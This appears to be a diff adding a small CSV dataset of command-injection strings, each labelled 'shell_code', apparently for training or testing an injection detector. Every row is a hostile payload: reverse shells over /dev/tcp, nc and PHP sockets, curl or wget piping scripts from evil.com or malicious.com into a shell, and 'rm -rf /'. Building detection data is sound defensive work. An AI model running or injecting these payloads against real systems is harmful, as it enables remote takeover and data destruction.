@@ -1,0 +1,25 @@
+input,label
+"$(echo hello)",shell_code
+"; rm -rf /",shell_code
+"| nc -e /bin/sh 192.168.0.1 1234",shell_code
+"& /bin/bash -i >& /dev/tcp/192.168.0.1/1234 0>&1",shell_code
+"| python -c 'import os; os.system(\"/bin/bash\")'",shell_code
+"| /bin/sh -c 'nc -lvp 1234'",shell_code
+"`wget http://malicious.com/malware.sh -O - | sh`",shell_code
+"| exec 5<>/dev/tcp/192.168.0.1/1234; cat <&5 | while read line; do $line 2>&5 >&5; done",shell_code
+"| ncat --udp 192.168.0.1 1234 -e /bin/bash",shell_code
+"; php -r '$sock=fsockopen(\"192.168.0.1\" 1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",shell_code
+"| curl http://malicious.com/shell.sh | sh",shell_code
+"| bash -i >& /dev/tcp/192.168.0.1/8080 0>&1",shell_code
+"& ncat 192.168.0.1 1234 -e /bin/sh",shell_code
+"| exec 3<>/dev/tcp/192.168.0.1/1234; cat <&3 | while read cmd; do $cmd 2>&3 >&3; done",shell_code
+"; wget http://evil.com/shell.sh -O /tmp/shell.sh; sh /tmp/shell.sh",shell_code
+"& curl -s http://evil.com/shell.sh | sh",shell_code
+"| python -c 'import urllib.request; exec(urllib.request.urlopen(\"http://evil.com/shell.py\").read())'",shell_code
+"| php -r 'file_get_contents(\"http://evil.com/shell.php\") | eval'",shell_code
+"'; /bin/bash -c 'bash -i >& /dev/tcp/192.168.0.1/1234 0>&1'",shell_code
+"| /bin/bash -i > /dev/tcp/192.168.0.1/1234 0<&1 2>&1",shell_code
+"&& bash -i >& /dev/tcp/192.168.0.1/1234 0>&1",shell_code
+"| exec 3<>/dev/tcp/192.168.0.1/1234; bash <&3 >&3 2>&3",shell_code
+"; wget -q -O- http://192.168.0.1/shell.sh | bash",shell_code
+"; curl -s http://192.168.0.1/shell.sh | bash",shell_code
